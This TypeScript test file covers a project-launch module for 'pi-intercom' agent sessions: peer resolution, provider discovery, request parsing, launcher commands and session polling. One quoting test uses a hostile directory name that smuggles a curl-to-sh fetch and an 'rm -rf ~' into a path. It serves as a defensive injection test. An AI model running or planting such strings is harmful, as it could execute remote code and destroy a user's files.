import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import type { ChildProcess } from "child_process";
import {
  PROJECT_LAUNCH_NAMESPACE,
  PROJECT_LAUNCH_REQUEST_TYPE,
  findProjectLaunchProvider,
  launchProjectCommand,
  openProjectPane,
  parseProjectLaunchRequest,
  projectLaunchRequestText,
  resolveProjectLauncherCommand,
  resolveTargetInCwd,
  waitForProjectSession,
  type LaunchCommandSpawn,
  type ProjectLaunchRequest,
} from "./project-agent.ts";
import type { SessionInfo } from "./types.ts";

function session(
  id: string,
  name: string | undefined,
  cwd: string,
  extra: Partial<SessionInfo> = {},
): SessionInfo {
  return {
    id,
    ...(name ? { name } : {}),
    cwd,
    model: "test-model",
    pid: process.pid,
    startedAt: 1,
    lastActivity: 1,
    ...extra,
  };
}

test("resolveTargetInCwd selects the sole peer in the requested cwd", () => {
  const resolved = resolveTargetInCwd({
    sessions: [
      session("self", "self", "/repo-a"),
      session("worker-a", "worker", "/repo-b"),
      session("worker-other", "worker", "/repo-c"),
    ],
    currentSessionId: "self",
    targetCwd: "/repo-b",
  });

  assert.equal(resolved.kind, "found");
  assert.equal(resolved.session?.id, "worker-a");
});

test("resolveTargetInCwd fails when a cwd has multiple possible peers and no target", () => {
  assert.throws(
    () => resolveTargetInCwd({
      sessions: [
        session("self", "self", "/repo-a"),
        session("worker-a", "worker-a", "/repo-b"),
        session("worker-b", "worker-b", "/repo-b"),
      ],
      currentSessionId: "self",
      targetCwd: "/repo-b",
    }),
    /Multiple intercom sessions are connected in \/repo-b/,
  );
});

test("resolveTargetInCwd scopes names to the requested cwd", () => {
  const resolved = resolveTargetInCwd({
    sessions: [
      session("self", "self", "/repo-a"),
      session("worker-a", "worker", "/repo-b"),
      session("worker-other", "worker", "/repo-c"),
    ],
    currentSessionId: "self",
    targetCwd: "/repo-b",
    to: "worker",
  });

  assert.equal(resolved.kind, "found");
  assert.equal(resolved.session?.id, "worker-a");
});

test("provider discovery prefers the longest-running advertised session and never picks self", () => {
  const advertised = (id: string, startedAt: number): SessionInfo => session(id, id, "/anywhere", {
    startedAt,
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });

  assert.equal(
    findProjectLaunchProvider([
      advertised("newer-provider", 300),
      advertised("older-provider", 100),
      session("plain-peer", "plain", "/anywhere"),
    ], "self")?.id,
    "older-provider",
    "the oldest running provider wins deterministically",
  );
  assert.equal(
    findProjectLaunchProvider([advertised("self-provider", 1)], "self-provider"),
    undefined,
    "the requesting session never provides its own launch",
  );
  assert.equal(
    findProjectLaunchProvider([session("plain", "plain", "/anywhere")], "self"),
    undefined,
    "sessions without the namespace are not providers",
  );
  const remoteProvider = session("remote-provider", "remote", "/anywhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
    federation: {
      originId: "host:penguin",
      remoteScopeAlias: "mistfall-remote",
      remoteStableSessionId: "remote-stable-id",
    },
  });
  assert.equal(
    findProjectLaunchProvider([remoteProvider], "self"),
    undefined,
    "federated rows are never picked as local project-launch providers",
  );
});

test("launch request text round-trips through the documented provider contract", () => {
  const request: ProjectLaunchRequest = {
    type: PROJECT_LAUNCH_REQUEST_TYPE,
    root: "/Users/me/projects/billing",
    command: "pi",
    focus: true,
  };
  const parsed = parseProjectLaunchRequest(projectLaunchRequestText(request));
  assert.deepEqual(parsed, request);
  assert.equal(parseProjectLaunchRequest("an ordinary human message"), undefined);
  assert.equal(parseProjectLaunchRequest(JSON.stringify({ type: "other-request" })), undefined);
  assert.equal(
    parseProjectLaunchRequest(JSON.stringify({ type: PROJECT_LAUNCH_REQUEST_TYPE, root: "", command: "pi", focus: true })),
    undefined,
  );
});

test("openProjectPane asks the registered provider and reports which provider launched the session", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-intercom-project-launch-"));
  const project = join(root, "project");
  mkdirSync(project);
  const provider = session("provider-1", "flightdeck", "/anywhere", {
    extensions: [{ namespace: PROJECT_LAUNCH_NAMESPACE, ownerEligible: false }],
  });
  const requests: Array<{ providerId: string; request: ProjectLaunchRequest }> = [];
  try {
    const launched = await openProjectPane({
      cwd: project,
      focus: false,
      sessions: [provider, session("self", "self", "/anywhere")],
      currentSessionId: "self",
      sendRequest: async (target, request) => {
        requests.push({ providerId: target.id, request });
        return { delivered: true };
      },
    });

    assert.equal(launched.projectRoot.includes("project"), true);
    assert.deepEqual(launched.provider, { kind: "session", sessionId: "provider-1", name: "flightdeck" });
    assert.equal(requests.length, 1);
    assert.equal(requests[0]?.providerId, "provider-1");
    assert.equal(requests[0]?.request.type, PROJECT_LAUNCH_REQUEST_TYPE);
    assert.equal(requests[0]?.request.command, "pi");
    assert.equal(requests[0]?.request.focus, false);
    assert.equal(requests[0]?.request.root, launched.projectRoot);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("openProjectPane falls back to the configured launch command when no provider is registered", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-intercom-command-launch-"));
  const project = join(root, "project");
  mkdirSync(project);
  const commandLines: string[] = [];
  const spawnImpl: LaunchCommandSpawn = (commandLine, options) => {
    commandLines.push(commandLine);
    assert.equal(options.cwd, options.env.PI_INTERCOM_PROJECT_ROOT);
    return {
      on: (event: string, listener: () => void) => {
        if (event === "close") setTimeout(listener, 1);
        return null as never as ChildProcess;
      },
      kill: () => {},
    } as unknown as ChildProcess;
  };
  try {
    const launched = await openProjectPane({
      cwd: project,
      sessions: [session("self", "self", "/anywhere")],
      currentSessionId: "self",
      launcherCommand: "tmux new-window -c \"{root}\" pi",
      sendRequest: () => Promise.reject(new Error("no provider should be asked")),
      spawnImpl,
    });

    assert.equal(launched.provider.kind, "command");
    if (launched.provider.kind === "command") {
      assert.equal(launched.provider.command, "tmux new-window -c \"{root}\" pi");
    }
    assert.equal(commandLines[0]?.startsWith("tmux new-window -c "), true);
    assert.match(commandLines[0] ?? "", / pi$/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("openProjectPane fails standalone with both generic integration paths when nothing is available", async () => {
  const root = mkdtempSync(join(tmpdir(), "pi-intercom-no-launcher-"));
  const project = join(root, "project");
  mkdirSync(project);
  try {
    await assert.rejects(
      openProjectPane({
        cwd: project,
        sessions: [session("self", "self", "/anywhere")],
        currentSessionId: "self",
        sendRequest: () => Promise.reject(new Error("no provider")),
      }),
      (error: Error) => /No project launcher is available[\s\S]*project-launch-v1[\s\S]*PI_INTERCOM_PROJECT_LAUNCHER/.test(error.message),
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("launch commands substitute {root} safely quoted and never carry injection metacharacters bare", async () => {
  const commandLines: string[] = [];
  const spawnImpl: LaunchCommandSpawn = (commandLine, _options) => {
    commandLines.push(commandLine);
    return {
      on: (event: string, listener: () => void) => {
        if (event === "close") setTimeout(listener, 1);
        return null as never as ChildProcess;
      },
      kill: () => {},
    } as unknown as ChildProcess;
  };

  await launchProjectCommand("open-terminal {root}", "/safe/project", { spawnImpl });
  assert.equal(commandLines[0], "open-terminal '/safe/project'");

  const hostile = "/tmp/x; curl ev'il|sh`$(rm -rf ~)";
  await launchProjectCommand("open-terminal {root}", hostile, { spawnImpl });
  assert.equal(
    commandLines[1],
    `open-terminal '${hostile.replaceAll("'", "'\\''")}'`,
    "a hostile directory name is fully contained inside shell quoting",
  );
});

test("launch commands substitute {root}, fail on early non-zero exit, and treat still-running commands as launched", async () => {
  const exitAfter = (delayMs: number, code: number | null): LaunchCommandSpawn => (_commandLine, _options) =>
    ({
      on: (event: string, listener: (exitCode: number | null) => void) => {
        if (event === "close") setTimeout(() => listener(code), delayMs);
        return null as never as ChildProcess;
      },
      kill: () => {},
    }) as unknown as ChildProcess;

  // A command that exits zero resolved the launch.
  await launchProjectCommand("open-terminal {root}", "/repo", { spawnImpl: exitAfter(5, 0) });
  // A command still running past the failure window launched fine; its later
  // exit (or lifetime) is not pi-intercom's to manage.
  await launchProjectCommand("open-terminal {root}", "/repo", {
    spawnImpl: exitAfter(5_000, 1),
    failureWindowMs: 50,
  });
  // A command that exits non-zero inside the window failed to launch.
  await assert.rejects(
    launchProjectCommand("open-terminal {root}", "/repo", { spawnImpl: exitAfter(10, 127) }),
    /exited with code 127/,
  );
  await assert.rejects(
    launchProjectCommand("", "/repo", { spawnImpl: exitAfter(10, 0) }),
    /must not be empty/,
  );
});

test("launcher command resolution prefers the environment over config and has no built-in default", () => {
  assert.equal(resolveProjectLauncherCommand({ PI_INTERCOM_PROJECT_LAUNCHER: "tmux new-window -c {root} pi" }), "tmux new-window -c {root} pi");
  assert.equal(resolveProjectLauncherCommand({}, "config-command"), "config-command");
  assert.equal(resolveProjectLauncherCommand({}, undefined), undefined);
  assert.equal(resolveProjectLauncherCommand({ PI_INTERCOM_PROJECT_LAUNCHER: "   " }, "config-command"), "config-command");
});

test("waitForProjectSession returns the new project-pane session when no target is named", async () => {
  const before = [session("self", "self", "/repo-a")];
  const after = [...before, session("pane-peer", "session-pane", "/repo-b")];
  let calls = 0;
  const client = {
    async listSessions() {
      calls += 1;
      return calls === 1 ? before : after;
    },
  };

  const resolved = await waitForProjectSession(client, {
    projectRoot: "/repo-b",
    currentSessionId: "self",
    beforeSessionIds: new Set(before.map((item) => item.id)),
    pollMs: 1,
    timeoutMs: 100,
  });

  assert.equal(resolved.id, "pane-peer");
});

test("waitForProjectSession honors the target guard after opening a project pane", async () => {
  const before = [session("self", "self", "/repo-a")];
  const afterUnnamed = [...before, session("pane-peer", "session-pane", "/repo-b")];
  const afterNamed = [...afterUnnamed, session("worker-id", "worker", "/repo-b")];
  let calls = 0;
  const client = {
    async listSessions() {
      calls += 1;
      if (calls === 1) return before;
      if (calls === 2) return afterUnnamed;
      return afterNamed;
    },
  };

  const resolved = await waitForProjectSession(client, {
    projectRoot: "/repo-b",
    currentSessionId: "self",
    beforeSessionIds: new Set(before.map((item) => item.id)),
    to: "worker",
    pollMs: 1,
    timeoutMs: 100,
  });

  assert.equal(resolved.id, "worker-id");
});
